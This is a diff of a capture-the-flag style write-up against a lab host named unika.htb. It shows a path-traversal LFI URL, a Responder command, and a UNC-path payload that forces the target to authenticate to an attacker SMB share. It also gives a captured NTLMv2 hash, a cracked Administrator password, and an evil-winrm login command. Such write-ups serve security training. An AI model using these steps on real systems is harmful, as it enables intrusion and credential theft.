@@ -78,6 +78,7 @@ OS fingerprinting suggested Windows 10 / Windows Server 2019.
 
 ### Host Discovery
 The web application referenced a domain name: *unika.htb*
+
 ![project unika](Capstone/Evidence/hostname.png)
 
 This was added to `/etc/hosts`:
@@ -111,6 +112,8 @@ Discovered endpoints included:
 - `/inc/`
 - `/js/`
 
+![project cgi](Capstone/Evidence/Information_Disclosure.png)
+
 The CGI script exposed internal environment variables.
 
 ---
@@ -130,13 +133,25 @@ This provided strong context for further exploitation.
 
 ### Local File Inclusion (LFI)
 
-The application parameter was vulnerable to path traversal:
+While interacting with the application, a language selection feature (FR / EN / DE)
+was observed. Selecting different languages modified the `page` parameter in the URL:
+
+![project ident](Capstone/Evidence/Vuln_Detection.png)
+
+This behavior indicated that the application dynamically includes files based on
+user-controlled input. Because the parameter directly references server-side files,
+it was identified as a potential attack vector for file inclusion vulnerabilities.
+
+Based on this observation, path traversal payloads were tested:
+
+
 ```
 http://unika.htb/index.php?page=../../../../../../windows/system32/drivers/etc/hosts
 ```
+![project hosts](Capstone/Evidence/caido_capture.png)
 
-
-This successfully disclosed the Windows hosts file, confirming LFI vulnerability.
+This successfully disclosed the Windows hosts file, confirming that the `page`
+parameter is vulnerable to **Local File Inclusion (LFI) via path traversal**.
 
 ---
 
@@ -144,6 +159,7 @@ This successfully disclosed the Windows hosts file, confirming LFI vulnerability
 
 Attempted RFI failed due to: *allow_url_include = 0*
 
+![project rfi](Capstone/Evidence/RFI.png)
 
 While RFI execution was blocked, the behavior still allowed outbound authentication
 attempts — which was later exploited using Responder.
@@ -156,6 +172,7 @@ attempts — which was later exploited using Responder.
 
 Responder was started on the attacker machine: *responder -I tun0*
 
+![project resp](Capstone/Evidence/Responder.png)
 
 A crafted request was used:
 ```
@@ -167,9 +184,6 @@ This forced the target to authenticate to the attacker-controlled SMB service.
 ### Result
 Responder successfully captured NTLMv2 hash:
 ```
-page=//10.10.15.192/someshare
-
-on responder we got 
 [SMB] NTLMv2-SSP Client   : 10.129.15.41
 [SMB] NTLMv2-SSP Username : RESPONDER\Administrator
 [SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:d8c7246615d1248f:092DB77B0AA0D6930F17BDAD9DE09010:010100000000000000D711482B89DC01EFB961AD5FD20C5B0000000002000800580059004400300001001E00570049004E002D0041004C003400570053005100540052004A005100360004003400570049004E002D0041004C003400570053005100540052004A00510036002E0058005900440030002E004C004F00430041004C000300140058005900440030002E004C004F00430041004C000500140058005900440030002E004C004F00430041004C000700080000D711482B89DC010600040002000000080030003000000000000000010000000020000010AD6A9C143DF276E3FCB57E3094B00C9DCA2B3622525BE66ECA1C45F915D28A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100390032000000000000000000   
@@ -206,5 +220,7 @@ Using cracked credentials:
 ```
 evil-winrm -u Administrator -p badminton -i 10.129.15.41
 ```
+![project access](Capstone/Evidence/Administrator_access.png)
+![project vali](Capstone/Evidence/Permission_validation.png)
 
 This confirms full system compromise.
